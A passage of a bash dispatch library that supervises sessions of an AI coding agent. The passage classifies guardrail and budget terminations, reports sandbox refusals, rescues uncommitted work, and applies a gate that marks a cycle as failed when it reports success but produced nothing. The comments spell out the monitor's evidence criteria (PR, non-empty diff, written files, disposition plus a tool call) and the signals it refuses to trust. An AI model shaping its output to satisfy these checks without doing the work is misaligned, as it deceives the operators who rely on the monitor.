    # logger.py:34-35 reports an OSError on stderr, but the sandbox root is a
    # writable tmpfs, so mkdir/open/write all SUCCEED and the file is simply
    # lost at teardown. Nothing raises. The only party that can notice is the
    # host, after the fact, by looking for the file it was promised.
    #
    # This must run AFTER the persistence above, which truncates ('>'); written
    # before, the confession would be the thing overwritten.
    #
    # -s, not -f: a .log created and left empty is the same observable failure
    # as a .log never created.
    _pilot_log_dir; _SESSION_LOG_PATH="$_PILOT_LOG_DIR/${LOG_ID}.log"
    if [ ! -s "$_SESSION_LOG_PATH" ]; then
        mkdir -p "$(dirname "$PERSISTENT_STDERR")" 2>/dev/null || true
        echo "dispatch-lib: pilot_log_guard.missing $_SESSION_LOG_PATH is absent or empty after the session — the session-log bind may have dropped (mika#2165)" \
            | tee -a "$PERSISTENT_STDERR" >&2
    fi
    # Issue #135: extract first JSON-object line from stdout
    PILOT_OUTPUT_RAW=$(cat "$STDOUT_FILE" 2>/dev/null)
    PILOT_OUTPUT=$(printf '%s\n' "$PILOT_OUTPUT_RAW" | grep -m1 '^{' || true)
    : "${PILOT_OUTPUT:=$PILOT_OUTPUT_RAW}"
    rm -f "$STDOUT_FILE"

    # Build result message from structured stdout
    STATUS=$(printf '%s\n' "$PILOT_OUTPUT" | jq -r '.status // empty' 2>/dev/null)
    SESSION_ID=$(printf '%s\n' "$PILOT_OUTPUT" | jq -r '.session_id // empty' 2>/dev/null)
    TURNS=$(printf '%s\n' "$PILOT_OUTPUT" | jq -r '.turns // empty' 2>/dev/null)
    # mika#1772: `status: terminated` covers TWO populations, and they need
    # different handling. claude-pilot sets it both for a guardrail abort and
    # for an SDK limit. The first kills a session that has usually done
    # nothing; the second kills one that has often done a great deal. Reading
    # the subtype is how this file tells them apart instead of guessing.
    #
    # mika#2149: the subtype vocabulary is NOT enumerated here. It is owned
    # upstream by `GuardrailAbortReason.guardrail`
    # (claude-pilot/src/claude_pilot/types.py) plus `SDK_TERMINATION_SUBTYPES`
    # and the cpp#187 transport halt in agent.py; downstream it is the `case`
    # table in `_halt_family` below, whose `*)` arm says out loud when a value
    # it does not know arrives. A prose list here went stale by five values in
    # eighteen days (cpp#119, #145, #168, #185, #187) because nothing read it.
    SUBTYPE=$(printf '%s\n' "$PILOT_OUTPUT" | jq -r '.subtype // empty' 2>/dev/null)
    TERMINATION_REASON=$(printf '%s\n' "$PILOT_OUTPUT" | jq -r '.termination_reason // empty' 2>/dev/null)
    # cpp#54 promised this field to "mika-dev dispatch-lib" as its consumer and
    # nothing here ever read it (mika#2149 P4). It is a qualifier on the
    # `Halt:` line, never a second classification axis: cpp#119 sets it only on
    # a `rate_limited` abort, and it is absent (`exclude_none`) otherwise.
    API_ERROR_STATUS=$(printf '%s\n' "$PILOT_OUTPUT" | jq -r '.api_error_status // empty' 2>/dev/null)
    COST=$(printf '%s\n' "$PILOT_OUTPUT" | jq -r '.cost_usd // empty' 2>/dev/null)
    DURATION=$(printf '%s\n' "$PILOT_OUTPUT" | jq -r '.duration_ms // empty' 2>/dev/null)

    # Compute POST_RUN_HEAD unconditionally (mika#1615): needed by recovery
    # blocks and downstream Unit 2 draft-PR creation regardless of whether
    # claude-pilot produced structured JSON output. Previously computed inside
    # Branch A only — Branch B (exit 0, non-JSON) and Branch C (non-zero exit)
    # silently skipped recovery because POST_RUN_HEAD was never set.
    if [ -n "$PRE_RUN_HEAD" ] && [ -n "$WORKTREE_DIR" ]; then
        POST_RUN_HEAD=$(git -C "$WORKTREE_DIR" rev-parse HEAD 2>/dev/null || true)
    fi

    if [ -n "$STATUS" ]; then
        RESULT="claude-pilot completed (status: ${STATUS}).
Session: ${SESSION_ID:-unknown}
Turns: ${TURNS:-unknown}
Cost: \$${COST:-unknown}
Duration: ${DURATION:-unknown}ms"

        if [ "$PILOT_EXIT" -ne 0 ]; then
            RESULT="${RESULT}
Note: process exited with code ${PILOT_EXIT} after session completed — result is valid."
        fi
    elif [ "$PILOT_EXIT" -eq 0 ]; then
        RESULT="claude-pilot completed (exit 0) but output was not structured JSON.

Stdout:
${PILOT_OUTPUT_RAW}"
    elif [ "$PILOT_EXIT" -eq 78 ]; then
        # mika#2141: 78 is _run_pilot_sandboxed refusing to launch. No pilot
        # process ever existed, so "FAILED (exit code 78)" with an empty stdout
        # would send the operator hunting for pilot drift that cannot be there.
        # The reason lives in $_PILOT_SANDBOX_REFUSAL and on stderr; carry it.
        #
        # mika#2049: the block no longer ends on "Fix the worktree, then
        # re-dispatch." That sentence was written for the two gitdir causes and
        # is FALSE for an egress refusal, whose worktree is healthy and whose
        # broken organ is the relay — a contradiction inside the only text AC2
        # makes readable, pointing the operator at the wrong organ at exactly the
        # moment they read fast. The remedy now travels inside the motive (see
        # the two `_PILOT_SANDBOX_REFUSAL` sites), so the text is entirely
        # motive-borne and the next containment refusal needs no edit here.
        #
        # The sentence that REMAINS is the one true of every cause: this is a
        # refusal, not drift and not a pipeline failure.
        _pilot_log_dir; RESULT="Log path: $_PILOT_LOG_DIR/${LOG_ID}.log

CONTAINMENT REFUSAL (exit 78) — the pilot was never launched.

${_PILOT_SANDBOX_REFUSAL:-The sandbox could not be built safely; see the stderr log.}

This is not pilot drift and not a pipeline failure: dispatch-lib declined to
build the sandbox rather than launch something it could not contain
(mika#2141, mika#2049)."
    else
        _pilot_log_dir; RESULT="Log path: $_PILOT_LOG_DIR/${LOG_ID}.log

claude-pilot FAILED (exit code ${PILOT_EXIT}).

Stdout:
${PILOT_OUTPUT_RAW}"
    fi

    # mika#1772: a session a guardrail killed never ran, so every downstream
    # check would be judging an empty worktree and reporting what it invented.
    # This guard has to live here rather than in dispatch_claude_pilot, because
    # _post_flight_recovery is called from THIS function — by the time control
    # returns to the caller, the false content diagnoses are already in RESULT
    # and a guard there could only prefix text that is already wrong.
    #
    # Post-flight recovery (mika#1615): otherwise runs unconditionally after exit
    # classification. Previously this logic lived inside the if [ -n "$STATUS" ]
    # branch only — Branch B (exit 0, non-JSON) and Branch C (non-zero exit)
    # silently skipped all recovery, losing uncommitted work.
    local _terminated_empty=0 _terminated_with_work=0
    if [ "$STATUS" = "terminated" ]; then
        if _pilot_left_no_work; then _terminated_empty=1; else _terminated_with_work=1; fi
    fi

    if [ "$_terminated_empty" = "1" ]; then
        PILOT_SESSION_TERMINATED=1
        RESULT=$(_classify_terminated_session)
    else
        _post_flight_recovery
        if [ "$_terminated_with_work" = "1" ]; then
            # A session killed AFTER producing work still needs every recovery
            # step above — the mika#1282 dirty-worktree rescue most of all, since
            # the next dispatch force-removes this worktree. It only needs the
            # operator to know the session did not finish, so the banner leads
            # and the measured recovery output follows.
            RESULT="$(_classify_terminated_session banner)

${RESULT}"
        fi
    fi

    # Append stderr tail for debugging context (last 10KB)
    if [ -s "$STDERR_FILE" ]; then
        STDERR_TAIL=$(tail -c 10000 "$STDERR_FILE" | _scrub_secrets_from_output)
        RESULT="${RESULT}

Logs (last 10KB):
${STDERR_TAIL}"
    fi
    rm -f "$STDERR_FILE"

    # Truncate to ~90KB to stay within the 100KB callback limit
    RESULT=$(printf '%s' "$RESULT" | head -c 92000)
}

# Did the finished pilot session leave anything behind?
#
# mika#1772. This is the measurement that separates the two populations
# `status: terminated` covers. A guardrail kill at turn 1 leaves no commit and a
# clean tree; an SDK-limit kill at turn 40 can leave both. Only the first may
# skip the recovery chain, and only the first may be told "nothing was written".
#
# Returns 0 (no work) when HEAD did not move AND the worktree is clean. A worktree
# that cannot be inspected counts as no work — the caller then reports a session
# failure rather than inventing a content diagnosis, which is the conservative
# direction for a tree nobody can read.
_pilot_left_no_work() {
    [ -n "$WORKTREE_DIR" ] && [ -d "$WORKTREE_DIR" ] || return 0
    [ "${PRE_RUN_HEAD:-}" = "${POST_RUN_HEAD:-}" ] || return 1
    [ -z "$(git -C "$WORKTREE_DIR" status --porcelain 2>/dev/null)" ] || return 1
    return 0
}

# Did this cycle produce anything at all? (mika#1996)
#
# The measurement `_pilot_left_no_work` performs is the right one, but it is
# reachable from a single branch — `STATUS = terminated`. Every other exit path
# (status: success with zero tool_use, exit 0 with unstructured output, non-zero
# exit, handler crash) delivers a verdict without anyone having looked at what
# the cycle produced. Measured on 2026-08-29: of the 120 most recent pilot
# sessions, 102 made ZERO tool calls and none exceeded 2; the last session above
# 10 tool calls was 2026-07-29. Every one of them reported success.
#
# NON-EMPTY is defined as: the cycle left at least one trace of production
# observable OUTSIDE its own process. Four proofs, first hit wins:
#
#   P1  a PR belongs to it                      (PR_URL)
#   P2  the branch advanced WITH content        (PRE..POST, non-empty diff)
#   P3  the worktree carries written files      (git status --porcelain)
#   P4  a MOTIVATED terminal disposition        (conclusive Outcome: AND >=1 tool call)
#
# What this explicitly does NOT count, because each one is what the loop used to
# accept instead of looking:
#   - process signals: exit code 0, `status: success`, callback delivered, a
#     task_id coming back;
#   - the model's output volume: turns, text length, cost, duration;
#   - files outside the repository (logs, /tmp, trace artifacts) — writing to
#     your own log is not producing;
#   - commits with no content: an --allow-empty marker (the wip(mika#1383)
#     rescue marker is one by construction) moves HEAD without producing
#     anything, so P2 requires a non-empty diff, not a moved HEAD;
#   - a disposition on its own: P4 is a conjunction, never an alternative. An
#     `Outcome:` line with zero tool calls is text about work, not work.
#   - reading: a session that made 40 read-only tool calls and left no P1-P3 and
#     no conclusive disposition is empty.
#
# Note the asymmetry, which is deliberate: the tool-call count is NOT the
# non-emptiness criterion. It qualifies P4 and enriches the message. It can
# neither rescue a cycle that produced nothing nor condemn one that produced
# something — it is read from a file that can be missing, and a criterion that
# depends on a missing file manufactures false reds.
#
# Three verdicts, not two. `undetermined` exists because a detector forced to
# choose between green and red when it has no ground to measure will always
# choose wrong: fail-closed manufactures false reds (and a false red trains
# people to ignore red), fail-open reproduces the original silence.
#
# Pure measurement: this function NEVER touches RESULT. Sets
# CYCLE_OUTPUT_VERDICT (produced|empty|undetermined), CYCLE_OUTPUT_EVIDENCE
# (what was measured, never what was assumed) and CYCLE_TOOL_CALLS.
_measure_cycle_output() {
    CYCLE_OUTPUT_VERDICT=""
    CYCLE_OUTPUT_EVIDENCE=""
    CYCLE_TOOL_CALLS=""

    local _wt_readable=0
    if [ -n "${WORKTREE_DIR:-}" ] && [ -d "${WORKTREE_DIR:-}" ] \
       && git -C "$WORKTREE_DIR" rev-parse --git-dir >/dev/null 2>&1; then
        _wt_readable=1
    fi

    # Tool-call count. `[tool:request]` is the first statement of claude-pilot's
    # canUseTool handler (claude-pilot/src/claude_pilot/permissions.py), so zero
    # means the SDK never invoked the callback — the model emitted no tool_use
    # at all. KTD3 of mika#1772 applies: stderr only enriches. An absent or
    # unreadable copy leaves the count empty and never decides a verdict.
    local _stderr_path
    _pilot_log_dir; _stderr_path="$_PILOT_LOG_DIR/${LOG_ID:-}.stderr"
    if [ -n "${LOG_ID:-}" ] && [ -r "$_stderr_path" ]; then
        CYCLE_TOOL_CALLS=$(grep -c '\[tool:request\]' "$_stderr_path" 2>/dev/null || true)
        case "${CYCLE_TOOL_CALLS}" in
            ''|*[!0-9]*) CYCLE_TOOL_CALLS="" ;;
        esac
    fi

    # --- P1: a PR belongs to this cycle. Measurable without a worktree.
    # The RESULT fallback matters on the crash path: the EXIT trap discovers the
    # PR with `gh pr list` and writes it as a `PR:` line without ever setting
    # PR_URL, so reading the variable alone would call a cycle with an open PR
    # empty.
    local _pr_line
    _pr_line=$(grep -m1 -E '^PR: http' <<<"${RESULT:-}" || true)
    if [ -n "${PR_URL:-}" ] || [ -n "$_pr_line" ]; then
        CYCLE_OUTPUT_VERDICT="produced"
        CYCLE_OUTPUT_EVIDENCE="PR ${PR_URL:-${_pr_line#PR: }}"
        return 0
    fi

    if [ "$_wt_readable" = "1" ]; then
        # --- P2: the branch advanced AND the advance carries content.
        # Both endpoints are verified to exist first: a stale SHA (worktree
        # recreated between runs) would make `git diff` exit 128, which reads
        # identically to "there is a diff" and would fabricate a produced verdict.
        if [ -n "${PRE_RUN_HEAD:-}" ] && [ -n "${POST_RUN_HEAD:-}" ] \
           && [ "${PRE_RUN_HEAD}" != "${POST_RUN_HEAD}" ] \
           && git -C "$WORKTREE_DIR" cat-file -e "${PRE_RUN_HEAD}^{commit}" 2>/dev/null \
           && git -C "$WORKTREE_DIR" cat-file -e "${POST_RUN_HEAD}^{commit}" 2>/dev/null \
           && ! git -C "$WORKTREE_DIR" diff --quiet "$PRE_RUN_HEAD" "$POST_RUN_HEAD" 2>/dev/null; then
            local _commit_count
            _commit_count=$(git -C "$WORKTREE_DIR" rev-list --count "${PRE_RUN_HEAD}..${POST_RUN_HEAD}" 2>/dev/null || true)
            CYCLE_OUTPUT_VERDICT="produced"
            CYCLE_OUTPUT_EVIDENCE="${_commit_count:-?} commit(s) carrying a non-empty diff (${PRE_RUN_HEAD}..${POST_RUN_HEAD})"
            return 0
        fi

        # --- P3: the worktree carries written files.
        if [ -n "$(git -C "$WORKTREE_DIR" status --porcelain 2>/dev/null)" ]; then
            CYCLE_OUTPUT_VERDICT="produced"
            CYCLE_OUTPUT_EVIDENCE="worktree carries uncommitted file changes"
            return 0
        fi
    fi

    # --- P4: a motivated terminal disposition. The conjunction is the point:
    # this is the clause that keeps a legitimately short cycle — a grooming that
    # escalates with a reason, a run that finds the work already done and says
    # so — out of the failure column, WITHOUT letting a silent session buy its
    # way out with a line of text.
    local _disposition
    _disposition=$(grep -m1 -E '^Outcome: (PR_OPENED|PLAN_COMMITTED|PLAN_GROOMED|ESCALATE)' <<<"${RESULT:-}" || true)
    if [ -n "$_disposition" ] && [ -n "$CYCLE_TOOL_CALLS" ] && [ "$CYCLE_TOOL_CALLS" -ge 1 ]; then
        CYCLE_OUTPUT_VERDICT="produced"
        CYCLE_OUTPUT_EVIDENCE="terminal disposition '${_disposition#Outcome: }' after ${CYCLE_TOOL_CALLS} tool call(s)"
        return 0
    fi

    # --- No ground to measure. Not a content verdict.
    if [ "$_wt_readable" != "1" ]; then
        CYCLE_OUTPUT_VERDICT="undetermined"
        CYCLE_OUTPUT_EVIDENCE="no readable git worktree at '${WORKTREE_DIR:-<unset>}'"
        return 0
    fi

    # --- Empty. Say what was measured, never more than was measured.
    local _head_fact
    if [ -z "${PRE_RUN_HEAD:-}" ] || [ -z "${POST_RUN_HEAD:-}" ]; then
        _head_fact="no HEAD range recorded"
    elif [ "${PRE_RUN_HEAD}" = "${POST_RUN_HEAD}" ]; then
        _head_fact="HEAD did not move"
    else
        _head_fact="HEAD moved but the commit range has an empty diff"
    fi
    CYCLE_OUTPUT_VERDICT="empty"
    CYCLE_OUTPUT_EVIDENCE="${_head_fact}, worktree clean, no PR, no motivated terminal disposition; tool calls: ${CYCLE_TOOL_CALLS:-unmeasured}"
    return 0
}

# The gate. A cycle that produced nothing may no longer report success.
#
# mika#1996, born from mika#1910. Bearing Prime 2026-08-26:
# CONTROL-MUST-BE-UNAVOIDABLE — a guarantee exists only if EVERY path producing
# the guarded effect crosses the control point. The guarded effect here is "a
# cycle verdict reaches mika-dev", and it has two producers: _deliver_callback
# and the EXIT trap, which sends its own callback rather than calling it. Both
# call this function; test-dispatch-lib.sh holds a static guard that fails if a
# third delivery site ever appears without it.
#
# Anti-vacuity runs BOTH ways, and the positive direction is the load-bearing
# one: on `produced` this function leaves RESULT byte-for-byte identical. A gate
# that only ever fails would be satisfied by "always fail", which is worth
# exactly as much as the silent success it replaces.
_gate_non_empty_cycle() {
    # No pilot session ran, so there is no cycle to judge. This covers the
    # dispatcher's own deliberate exits — the mika#988 closed-issue auto-skip,
    # the mika#2012 already-groomed refusal, a dry run, a crash before launch.
    # Their callbacks are structured decisions (the auto-skip ones are a JSON
    # document mika-dev and the audit dashboard parse), not prose to annotate,
    # and calling a deliberate decision "empty" would be exactly the false red
    # this gate exists to avoid — a false red trains people to ignore red.
    if [ "${PILOT_RAN:-0}" != "1" ]; then
        echo "cycle_output.not_applicable: no pilot session ran — nothing to judge (task=${TASK_ID:-unknown} skill=${SKILL:-unknown})" >&2
        return 0
    fi

    _measure_cycle_output

    echo "cycle_output.${CYCLE_OUTPUT_VERDICT}: ${CYCLE_OUTPUT_EVIDENCE} (task=${TASK_ID:-unknown} skill=${SKILL:-unknown} session=${SESSION_ID:-unknown})" >&2

    case "$CYCLE_OUTPUT_VERDICT" in
        produced)
            # RESULT untouched. This is an invariant, not an optimisation.
            return 0
            ;;
        undetermined)
            if ! grep -qF -- 'Measurement: cycle output undetermined' <<<"${RESULT:-}"; then
                RESULT="${RESULT}

Measurement: cycle output undetermined — ${CYCLE_OUTPUT_EVIDENCE}. This is NOT a content verdict: the non-empty-output gate (mika#1996) had no ground to measure. The outcome above is the cycle's own."
            fi
            return 0
            ;;
    esac

    # --- empty ---

    # Idempotent: _deliver_callback and the EXIT trap can both run in one
    # process. One banner, not two.
    if grep -qF -- 'PIPELINE FAILURE: empty_completion' <<<"${RESULT:-}"; then
        return 0
    fi

    # A cycle already classified as failed or cancelled keeps its own diagnosis.
    # Stacking a second one is the surest way to make red unreadable, and the
    # first diagnosis is always the more specific: a terminated session, a push
    # violation (mika#1318), a handler crash, an operator cancel (mika#749) each
    # name a cause this gate could only describe as an absence. `STATUS=CANCELLED*`
    # additionally has to lead the callback for mika-dev's parser, which a
    # prefixed banner would break.
    if grep -qE '(PIPELINE FAILURE:|STRUCTURAL VIOLATION:|HANDLER CRASH|^STATUS=CANCELLED|^Outcome: PIPELINE_INCOMPLETE)' <<<"${RESULT:-}"; then
        echo "cycle_output.empty.banner_skipped: callback already carries a terminal classification — not stacking a second diagnosis" >&2
        return 0
    fi

    RESULT="PIPELINE FAILURE: empty_completion — this cycle produced nothing, and a cycle that produces nothing does not succeed (mika#1996).

Measured: ${CYCLE_OUTPUT_EVIDENCE}
Applied definition: a cycle is non-empty when it left a trace of production observable outside its own process — a PR, commits carrying a non-empty diff, written files in the worktree, or a conclusive disposition backed by at least one tool call. Exit code 0, \`status: success\`, a delivered callback and a returned task_id are NOT production signals; neither are turns, cost or duration.
What this is not: this is a session-level verdict, not a review of content quality. The pilot did not fail at the work — it did not do any.

${RESULT}"

    local _outcome_line="Outcome: PIPELINE_INCOMPLETE — empty_completion: ${CYCLE_OUTPUT_EVIDENCE}"
    if grep -qE '^Outcome: ' <<<"$RESULT"; then
        # First `Outcome:`-anchored line only. awk rather than sed: the evidence
        # string is data and must not be re-read as a replacement pattern.
        RESULT=$(awk -v repl="$_outcome_line" \
            'BEGIN { done = 0 }
             /^Outcome: / && !done { print repl; done = 1; next }
             { print }' <<<"$RESULT")
    else
        RESULT="${RESULT}

${_outcome_line}"
    fi
}

# Compose the callback for a pilot session claude-pilot terminated.
#
# mika#1772. On 2026-08-28 two dev-groom dispatches of mika#2013 came back with
# `status: terminated`, `Turns: 2`, and `[guardrail] idle_timeout: No meaningful
# progress for 300s` — the first made zero tool calls, the second made one. No
# plan was written and the architect was never reached. dispatch-lib ran the
# whole content-validation chain over that empty session anyway and produced a
# callback whose first three statements were all false, the loudest of them
# telling the operator to go find a missing architect verdict.
#
# Two modes, because `terminated` covers two populations (see _pilot_left_no_work):
#   full   — the session left nothing. The message says so, and carries the
#            Outcome line, because the caller skipped the recovery chain.
#   banner — the session left work. Says only what was measured and carries NO
#            Outcome line; the recovery chain ran and owns that.
#
# Reads STATUS, SUBTYPE, TERMINATION_REASON, SESSION_ID, TURNS, DURATION,
# PRE_RUN_HEAD, POST_RUN_HEAD, LOG_ID, STDERR_FILE. Prints the callback body.
# mika#2149 (C-1): one halt motif -> `<family>|<hint>|<meaning>` on stdout.
#
# This `case` IS the downstream enumeration of claude-pilot's halt vocabulary —
# the upstream one is `GuardrailAbortReason.guardrail` in
# claude-pilot/src/claude_pilot/types.py, plus `SDK_TERMINATION_SUBTYPES` and
# the cpp#187 transport halt in agent.py. test-dispatch-lib.sh's drift guard
# reads that Literal and refuses any value this table would class `unknown`.
#
# The three hints are annotations, not decisions — nothing reads them to
# decide a retry yet (out of scope, see the ticket):
#   transient     — the cause is OUTSIDE the session (quota, model mute
#                   upstream); a re-run has a fair chance of not seeing it again.
#   deterministic — the cause is IN what the session did; a re-run from the
#                   same state reproduces it, and what matters is what it left.
#   investigate   — a re-run teaches nothing until the cause has been read.
#                   Neither a promise nor a ban: a pointer to the log.
# Each hint is written to the height of what the upstream comment asserts
# (source cited per row) and no further; where upstream does not rule —
# stall_detected, empty_response, idle_timeout — the hint is `investigate`.
#
# The `*)` arm is the whole point (R-4): a subtype added upstream is classed
# `unknown`, hinted `investigate`, and the CALLER (`_classify_terminated_session`)
# writes the `halt_family.unknown` line into the two sinks that actually
# persist. Not from here, and not with a bare `>&2`: this function runs inside
# `dispatch_claude_pilot`, whose fd 2 is `/dev/null` from the moment
# `exec 9>>"$TRACE_FILE" 2>/dev/null` runs (mika#903), and outside the one
# `2>"$STDERR_FILE"` redirection that covers the pilot command alone — the
# Signal M class the root CLAUDE.md documents, found by the mika#2149 review.
_halt_family() {
    local subtype="${1:-}"
    case "$subtype" in
        rate_limited)
            printf '%s\n' "quota_throttled|transient|the API refused (429) and the SDK exhausted its backoff; the session did nothing wrong" ;;                       # cpp#119, cpp#133
        awaiting_model)
            printf '%s\n' "model_never_resumed|transient|the model never returned the first token of the next turn; the session was waiting, not looping" ;;             # cpp#145
        awaiting_tool)
            printf '%s\n' "tool_never_returned|investigate|a tool never returned its result; re-running without reading which one replays it" ;;                       # cpp#145
        idle_timeout)
            printf '%s\n' "session_silent|investigate|real silence with nobody outstanding; the cause is in the log, not in a re-run" ;;                                # cpp#54, refined cpp#145
        stall_detected)
            printf '%s\n' "model_unproductive|investigate|N turns without a tool call; the starting state leads the model nowhere" ;;                                   # cpp#54
        empty_response)
            printf '%s\n' "model_unproductive|investigate|N consecutive empty responses" ;;                                                                              # cpp#54
        watchdog_error)
            printf '%s\n' "pilot_bug|investigate|the watchdog itself raised; a claude-pilot defect, not a session one" ;;                                               # cpp#168
        prompt_cache_dead)
            printf '%s\n' "substrate|investigate|the prompt cache is no longer read; check the relay (mika#2313/#2316) before any re-run" ;;                              # cpp#185 D1
        error_max_turns)
            printf '%s\n' "budget_exhausted|deterministic|SDK turn limit reached; work was produced and the recovery chain carries it" ;;                              # agent.py SDK_TERMINATION_SUBTYPES
        error_max_budget_usd)
            printf '%s\n' "budget_exhausted|deterministic|SDK dollar limit reached; work was produced and the recovery chain carries it" ;;                            # agent.py SDK_TERMINATION_SUBTYPES
        transport_message_too_large)
            printf '%s\n' "transport|investigate|one NDJSON message exceeded max_buffer_size" ;;                                                                         # cpp#187
        *)
            printf '%s\n' "unknown|investigate|subtype outside the downstream table; see _halt_family in dispatch-lib.sh and GuardrailAbortReason in claude-pilot" ;;
    esac
}

# The three hints' one-line definitions, rendered after the family so the
# operator reading the callback does not have to open this file.
_halt_hint_meaning() {
    case "${1:-}" in
        transient)     printf '%s' "the cause is outside the session; a re-run has a fair chance of not seeing it again" ;;
        deterministic) printf '%s' "the cause is in what the session did; a re-run from the same state reproduces it — what it left behind is what counts" ;;
        *)             printf '%s' "a re-run teaches nothing until the cause has been read; neither a promise nor a ban" ;;
    esac
}

_classify_terminated_session() {
    local mode="${1:-full}"
    local cause guardrail="" stderr_path _candidate
    local halt_subtype="" halt_row halt_family halt_hint halt_meaning halt_lines

    # The halt cause comes from the structured result first. claude-pilot puts
    # the guardrail name in `.subtype` and its detail in `.termination_reason`
    # (agent.py:155-162), which is more reliable than scraping stderr and is the
    # only signal that distinguishes a guardrail abort from an SDK limit.
    if [ -n "${SUBTYPE:-}" ]; then
        # mika#2149 (C-3): `api_error_status` is a qualifier, inserted only when
        # the result carried it.
        cause="Halt: ${SUBTYPE}${API_ERROR_STATUS:+ (HTTP ${API_ERROR_STATUS})}${TERMINATION_REASON:+ — ${TERMINATION_REASON}}"
        halt_subtype="$SUBTYPE"
    else
        # Fallback for a result without a subtype: scrape the `[guardrail]` line.
        # Prefer the stderr still in hand; the persisted copy may not exist yet
        # if the mkdir/scrub at the top of this run failed.
        # KTD3: stderr only enriches. STATUS is the classification, so a missing
        # or unreadable copy degrades the text and never the verdict — both
        # 2026-08-28 tasks had no .log file at all, and a fail-closed read here
        # would have hidden the entire class.
        _pilot_log_dir; stderr_path="$_PILOT_LOG_DIR/${LOG_ID}.stderr"
        for _candidate in "${STDERR_FILE:-}" "$stderr_path"; do
            [ -n "$_candidate" ] && [ -f "$_candidate" ] && [ -r "$_candidate" ] || continue
            guardrail=$(sed 's/\x1b\[[0-9;]*[mK]//g' "$_candidate" 2>/dev/null \
                | grep -m1 '\[guardrail\]' || true)
            [ -n "$guardrail" ] && break
        done
        if [ -n "$guardrail" ]; then
            cause="Halt: ${guardrail}"
            # mika#2149 (C-4): the scraped line feeds the same table, so a halt
            # is never classed `unknown` for having arrived by the other
            # channel. The ANSI strip above already ran; ui.py:113 writes
            # `[guardrail] <name>: <detail>`.
            halt_subtype=$(printf '%s\n' "$guardrail" | sed -n 's/.*\[guardrail\] \([a-z0-9_]*\):.*/\1/p')
        else
            cause="Halt: cause not recorded — no subtype on the result and no [guardrail] line in stderr."
        fi
    fi

    # mika#2149 (C-2): two stable prefixes after `Halt:`, in both modes — same
    # contract as `Outcome:` and `RECOVERY_PENDING:` (one line, one prefix,
    # `grep -m1` suffices). An empty halt_subtype (no JSON subtype, no
    # [guardrail] line) goes through the `*)` arm and is said as such.
    halt_row=$(_halt_family "$halt_subtype")
    halt_family=${halt_row%%|*}
    halt_hint=${halt_row#*|}; halt_hint=${halt_hint%%|*}
    halt_meaning=${halt_row##*|}
    # R-4, the drift line — written where it persists (mika#2149 review, #1).
    # `$STDERR_FILE` is still on disk here and the callback's 10 KB tail is
    # built from it a few lines after this function returns; `$PERSISTENT_STDERR`
    # was already written once, so append — the mika#2165 shape at
    # `pilot_log_guard.missing`. An EMPTY subtype is "cause not recorded",
    # already said on the Halt: line and not an upstream drift, so it stays
    # silent: only a non-empty stranger is worth the grep hit.
    if [ "$halt_family" = "unknown" ] && [ -n "$halt_subtype" ]; then
        printf 'dispatch-lib: halt_family.unknown subtype=%s\n' "$halt_subtype" \
            | tee -a "${STDERR_FILE:-/dev/null}" "${PERSISTENT_STDERR:-/dev/null}" >&2 2>/dev/null || true
    fi
    halt_lines="Halt class: ${halt_family} — ${halt_meaning}
Retry hint: ${halt_hint} — $(_halt_hint_meaning "$halt_hint")"

    if [ "$mode" = "banner" ]; then
        printf '%s' "PIPELINE FAILURE: the claude-pilot session was terminated before it finished, but it left work behind. Everything below was produced by an incomplete session — treat it as unvalidated.

Session: ${SESSION_ID:-unknown}
Turns: ${TURNS:-unknown}
Duration: ${DURATION:-unknown}ms
${cause}
${halt_lines}
Commits: ${PRE_RUN_HEAD:-unknown}..${POST_RUN_HEAD:-unknown}"
        return 0
    fi

    printf '%s' "PIPELINE FAILURE: the claude-pilot session was terminated before it produced any work. This is a session failure, not a content failure.

Session: ${SESSION_ID:-unknown}
Turns: ${TURNS:-unknown}
Duration: ${DURATION:-unknown}ms
${cause}
${halt_lines}

HEAD did not move and the worktree is clean, so nothing was written to the branch and the architect was never invoked. There is no plan and no verdict to go looking for. The cause is upstream of grooming — the pilot never got far enough to do its work. See the stall lineage on mika#1901 and the note above _run_pilot_sandboxed on the Anthropic 401 / SDK-stall chain that ends in exactly this shape.

Outcome: PIPELINE_INCOMPLETE — pilot session terminated by claude-pilot before producing work."
}

# Compose the note a successful rescue commit leaves behind (mika#2031 R6).
#
# A rescue that preserves the content but says nothing is nearly as bad as a
# deletion: `Saved working directory and index state WIP on main` tells nobody
# there is anything to go and get. So the note names all three of what, where,
# and how to reach it — the files that were staged, the rescue commit's sha, and
# the branch it sits on. `_push_branch` reports the remote leg separately.
#
# Args: $1 = newline-separated rescued file list
#       $2 = "" | " + mika#1296" (the cargo-fmt retry path's provenance)
# Reads: SKILL, WORKTREE_DIR, BRANCH, PILOT_EXIT.
_compose_rescue_note() {
    local _files="$1" _extra="${2:-}" _sha
    _sha=$(git -C "$WORKTREE_DIR" rev-parse --short HEAD 2>/dev/null || echo unknown)

    if [ "$SKILL" = "dev-groom" ]; then
        # NOT a PIPELINE FAILURE (mika#2031 R7): the rescue did its job and the
        # architect pass can still run against the now-committed plan. Preserve
        # first, unblock second — this is the second half reporting the first.
        printf '%s' "dispatch-lib (mika#2031${_extra}): uncommitted grooming content preserved before anything else ran.
Rescued into commit ${_sha} on branch ${BRANCH:-<unknown>}.
Files rescued:
${_files}
The pilot wrote this and never committed it, so no branch and no remote held a
copy — the next dispatch's worktree removal would have destroyed it. It is on
the branch now; _push_branch publishes it and grooming continues from there."
    else
        printf '%s' "PIPELINE FAILURE: claude-pilot exited ${PILOT_EXIT:-unknown} with HEAD unchanged — dirty worktree detected and auto-committed (mika#1282${_extra} recovery).
Rescued into commit ${_sha} on branch ${BRANCH:-<unknown>}.
Files rescued:
${_files}"
    fi
}

# The scaffold paths every rescue staging gesture excludes, written ONCE
# (mika#2348 D2). Each entry was added by a distinct incident, and by the time
# mika#2348 read this file the four-entry list had been copied verbatim to five
# sites:
#   - .claude/commands/            slash-command snapshots from mika-platform
#                                  (mika#1288)
#   - .claude/claude-pilot.json    relay config cp'd from $PLATFORM_DIR at :489.
#                                  Without this one the rescue re-introduces the
#                                  intentional deletion that shipped in PR #1348
#                                  (mika#1193 Phase C) — the founding incident
#                                  for mika#1419.
#   - .claude/settings.local.json  operator permission allowlist cp'd at :490.
#                                  cm#5 (2026-06-16) produced PR #16 whose only
#                                  "rescued" content was a 143-line allowlist
#                                  leak (mika#1552 founding incident).
#   - .claude/*.local.*            general guard for the .env-class of
#                                  operator-machine-specific Claude-local files.
# None of them is pilot-authored content.
#
# A fifth copy would diverge — that is exactly the drift class that produced
# mika#2348's T1: the mika#1383 block says "Same exclusion pattern as mika#1282",
